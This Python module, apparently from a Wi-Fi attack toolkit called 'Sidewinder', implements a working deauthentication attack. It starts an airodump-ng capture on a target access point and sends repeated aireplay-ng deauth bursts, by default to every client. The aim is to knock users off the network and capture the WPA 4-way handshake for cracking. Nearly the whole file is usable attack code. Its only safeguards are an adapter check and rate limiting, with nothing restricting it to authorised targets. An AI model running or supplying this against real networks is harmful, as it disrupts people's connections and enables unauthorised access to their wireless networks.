"""Sidewinder Deauth Attack Module.

Sends deauthentication frames to force clients to reconnect,
capturing the WPA 4-way handshake in the process.

Attack flow:
  1. Validate adapter supports injection (check_adapter_allowed)
  2. Set channel to target AP's channel
  3. Start capture (airodump-ng) on target BSSID
  4. Wait 1s for capture to initialize
  5. Send deauth frames via aireplay-ng
  6. Poll PCAP for EAPOL handshake
  7. Return HandshakeResult

Design decisions:
  - Channel passed explicitly (from target selection) — never looked up dynamically
  - Rate limiting via count parameter (deauths per burst)
  - Cooldown between bursts to avoid AP lockout
  - Adapter injection check before any frame is sent
"""
from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from typing import Callable, Optional

from ..adapters.mt7902 import check_adapter_allowed
from ..core.capture import capture_passive
from ..core.session import HandshakeResult
from ..core.subprocess_mgr import SubprocessManager, get_manager

logger = logging.getLogger(__name__)


@dataclass
class DeauthConfig:
    """Configuration for a deauth attack.

    Attributes:
        bssid:        Target AP BSSID.
        client:       Target client MAC (or FF:FF:FF:FF:FF:FF for broadcast).
        channel:      Target AP channel (must be known before calling).
        count:        Number of deauth frames per burst (default 10).
        bursts:       Number of deauth bursts (default 3).
        cooldown:     Seconds between bursts (default 10).
        timeout:      Max seconds for capture (default 300 = 5 min).
        output_prefix: Prefix for capture files.
    """

    bssid: str
    client: str = "FF:FF:FF:FF:FF:FF"
    channel: int = 6
    count: int = 10
    bursts: int = 3
    cooldown: float = 10.0
    timeout: float = 300.0
    output_prefix: str = "/tmp/sidewinder_cap"


@dataclass
class DeauthResult:
    """Result of a deauth attack.

    Attributes:
        handshake:      Captured handshake (None if not captured).
        deauths_sent:   Total deauth frames sent.
        bursts_sent:    Number of bursts completed.
        errors:         Error messages encountered during attack.
    """

    handshake: Optional[HandshakeResult] = None
    deauths_sent: int = 0
    bursts_sent: int = 0
    errors: list[str] = field(default_factory=list)


async def run_deauth(
    iface: str,
    phy: str,
    config: DeauthConfig,
    mgr: Optional[SubprocessManager] = None,
    on_progress: Optional[Callable[..., None]] = None,
) -> DeauthResult:
    """Execute a deauth attack with capture.

    Args:
        iface:        Wireless interface name.
        phy:          PHY name.
        config:       Deauth attack configuration.
        mgr:          Optional SubprocessManager instance.
        on_progress:  Optional callback for progress updates.

    Returns:
        DeauthResult with handshake and stats.

    Raises:
        SidewinderError: If adapter doesn't support injection.
    """
    _mgr = mgr or get_manager()
    result = DeauthResult()

    # Validate adapter supports injection
    # Extract chipset from interface sysfs (simplified — real impl uses adapter detection)
    try:
        from ..core.adapter import detect_adapter
        info = detect_adapter(iface)
        chipset = info.chipset if info else "UNKNOWN"
    except Exception:
        chipset = "UNKNOWN"

    check_adapter_allowed(chipset, "deauth")

    logger.info(
        "Starting deauth: BSSID=%s client=%s ch%d (count=%d, bursts=%d)",
        config.bssid, config.client, config.channel,
        config.count, config.bursts,
    )

    # Start capture first
    capture_task = asyncio.create_task(
        capture_passive(
            mon_iface=iface,
            bssid=config.bssid,
            channel=config.channel,
            output_prefix=config.output_prefix,
            timeout=config.timeout,
            mgr=_mgr,
        )
    )

    # Wait for capture to initialize
    await asyncio.sleep(1.0)

    # Send deauth bursts
    for burst in range(config.bursts):
        try:
            deauth_cmd = [
                "aireplay-ng",
                "--deauth", str(config.count),
                "-a", config.bssid,
                "-c", config.client,
                iface,
            ]

            proc = await _mgr.start_background(deauth_cmd)
            result.deauths_sent += config.count
            result.bursts_sent += 1

            logger.info(
                "Burst %d/%d: sent %d deauths",
                burst + 1, config.bursts, config.count,
            )

            if on_progress:
                on_progress(
                    burst=burst + 1,
                    total_bursts=config.bursts,
                    deauths_sent=result.deauths_sent,
                )

            # Wait for deauth to complete, then cooldown
            try:
                await asyncio.wait_for(proc.wait(), timeout=15.0)
            except asyncio.TimeoutError:
                await _mgr.kill_background(proc)
                logger.warning("Deauth burst %d timed out", burst + 1)

            # Cooldown between bursts (skip after last burst)
            if burst < config.bursts - 1:
                logger.info("Cooldown %.1fs...", config.cooldown)
                await asyncio.sleep(config.cooldown)

        except Exception as e:
            error_msg = f"Burst {burst + 1} failed: {e}"
            logger.warning(error_msg)
            result.errors.append(error_msg)

    # Wait for handshake capture
    try:
        result.handshake = await asyncio.wait_for(
            capture_task,
            timeout=config.timeout,
        )
    except asyncio.TimeoutError:
        result.handshake = None
        capture_task.cancel()
        logger.warning("Capture timed out after %ds", int(config.timeout))

    if result.handshake:
        logger.info(
            "Handshake captured: status=%s M1=%s M2=%s M3=%s M4=%s",
            result.handshake.status,
            result.handshake.m1,
            result.handshake.m2,
            result.handshake.m3,
            result.handshake.m4,
        )
    else:
        logger.warning("No handshake captured")

    return result
